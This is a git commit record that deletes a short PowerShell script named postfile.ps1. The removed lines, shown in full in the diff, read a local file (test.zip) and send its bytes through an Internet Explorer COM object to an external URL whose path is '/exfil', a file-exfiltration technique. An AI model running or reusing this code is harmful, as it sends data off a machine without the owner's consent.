a6b1cc6e6d2f3985274ca7706867bbbfc76da82e
meowlink42 <69475514+meowlink42@users.noreply.github.com>
2020-08-20 00:16:21 -0400

    Delete postfile.ps1

--- postfile.ps1
+++
@@ -1,3 +0,0 @@
-$ieObject = New-Object -ComObject 'InternetExplorer.Application';
-$f = [System.IO.File]::ReadAllBytes('.\test.zip');
-$ieObject.navigate("http://loudounschools.org/exfil", $null, $null, $f);
